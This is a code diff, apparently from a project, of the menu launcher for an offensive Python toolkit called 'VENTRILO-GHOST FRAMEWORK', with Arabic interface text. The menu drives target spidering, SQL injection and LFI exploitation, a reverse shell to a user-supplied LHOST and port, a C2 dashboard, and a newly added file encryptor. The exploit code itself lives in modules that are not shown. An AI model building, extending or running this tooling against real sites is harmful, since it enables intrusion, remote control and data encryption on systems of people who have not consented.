@@ -6,71 +6,43 @@ from colorama import Fore, Style, init
 # استيراد الوحدات التي طورناها في مجلد core
 from core.scanner import GhostScanner
 from core.exploiter import GhostExploiter
+from core.encryptor import GhostEncryptor
 
 # تهيئة الألوان
 init(autoreset=True)
 
 def banner():
-    print(f"""
-    {Fore.BLUE}############################################################
-    #                                                          #
-    #   {Fore.WHITE}VENTRILO-GHOST FRAMEWORK v2.0 - 2026               {Fore.BLUE}#
-    #   {Fore.CYAN}Developed by: SayerLinux                           {Fore.BLUE}#
-    #   {Fore.CYAN}Email: mailto:SaudiLinux1@gmail.com                       {Fore.BLUE}#
-    #                                                          #
-    ############################################################
-    """)
+    print(f"{Fore.BLUE}#"*60 + f"\n#  {Fore.WHITE}VENTRILO-GHOST FRAMEWORK v1.1.0 // {Fore.CYAN}SayerLinux {Fore.BLUE} #\n" + f"{Fore.BLUE}#"*60)
 
 async def main():
     os.system('cls' if os.name == 'nt' else 'clear')
     banner()
+    print(f"{Fore.YELLOW}[1] {Fore.WHITE}الفحص العميق (Spider)")
+    print(f"{Fore.YELLOW}[2] {Fore.WHITE}استغلال SQL Injection")
+    print(f"{Fore.YELLOW}[3] {Fore.WHITE}استغلال LFI")
+    print(f"{Fore.YELLOW}[4] {Fore.WHITE}فتح Reverse Shell")
+    print(f"{Fore.YELLOW}[5] {Fore.WHITE}لوحة التحكم C2")
+    print(f"{Fore.YELLOW}[6] {Fore.WHITE}تشفير البيانات (Ghost Encryptor)")
+    print(f"{Fore.RED}[0] {Fore.WHITE}خروج")
     
-    print(f"{Fore.YELLOW}[1] {Fore.WHITE}بدء الفحص العميق والعنكبوت (Deep Scan & Spider)")
-    print(f"{Fore.YELLOW}[2] {Fore.WHITE}اختبار استغلال SQL Injection")
-    print(f"{Fore.YELLOW}[3] {Fore.WHITE}اختبار استغلال LFI (تضمين ملفات النظام)")
-    print(f"{Fore.YELLOW}[4] {Fore.WHITE}فتح اتصال عكسي والتحكم الكامل (Reverse Shell)")
-    print(f"{Fore.YELLOW}[5] {Fore.WHITE}تشغيل لوحة التحكم C2 (Dashboard)")
-    print(f"{Fore.RED}[0] {Fore.WHITE}خروج (Exit)")
-    
-    choice = input(f"
-{Fore.BLUE}[SayerLinux-Ghost]> {Fore.WHITE}")
+    choice = input(f"\n{Fore.BLUE}[SayerLinux-Ghost]> ")
 
     if choice == '1':
-        target = input(f"{Fore.CYAN}[?] أدخل رابط الموقع المستهدف: {Fore.WHITE}")
-        scanner = GhostScanner(target)
-        await scanner.start()
-    
-    elif choice in ['2', '3', '4']:
-        target = input(f"{Fore.CYAN}[?] أدخل رابط الصفحة المصابة: {Fore.WHITE}")
-        exploiter = GhostExploiter(target)
-        
-        if choice == '2':
-            param = input(f"{Fore.CYAN}[?] أدخل اسم المعامل المصاب (مثل id): {Fore.WHITE}")
-            exploiter.verify_sqli(param)
-        
-        elif choice == '3':
-            param = input(f"{Fore.CYAN}[?] أدخل اسم المعامل المصاب (مثل file): {Fore.WHITE}")
-            exploiter.test_lfi(param)
-            
-        elif choice == '4':
-            lhost = input(f"{Fore.CYAN}[?] أدخل عنوان IP الخاص بك (LHOST): {Fore.WHITE}")
-            lport = input(f"{Fore.CYAN}[?] أدخل المنفذ (LPORT): {Fore.WHITE}")
-            exploiter.trigger_reverse_shell(lhost, lport)
-            
+        target = input("[?] Target URL: ")
+        await GhostScanner(target).start()
+    elif choice in ['2','3','4']:
+        target = input("[?] Target URL: ")
+        exp = GhostExploiter(target)
+        if choice == '2': exp.verify_sqli(input("[?] Param (id): "))
+        elif choice == '3': exp.test_lfi(input("[?] Param (file): "))
+        elif choice == '4': exp.trigger_reverse_shell(input("[?] LHOST: "), input("[?] LPORT: "))
     elif choice == '5':
-        print(f"{Fore.GREEN}[*] جاري تشغيل لوحة التحكم C2... افتح المتصفح على http://localhost:5000")
         os.system("python c2_server/app.py")
-        
-    elif choice == '0':
-        print(f"{Fore.RED}[!] وداعاً يا بطل!")
-        sys.exit()
-    
-    else:
-        print(f"{Fore.RED}[!] اختيار خاطئ!")
+    elif choice == '6':
+        enc = GhostEncryptor()
+        path = input("[?] File Path to Encrypt: ")
+        if os.path.isfile(path): enc.encrypt_file(path)
+        else: print(f"Encrypted: {enc.encrypt_data(path)}")
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print(f"
-{Fore.RED}[!] تم إيقاف البرنامج.")
+    asyncio.run(main())
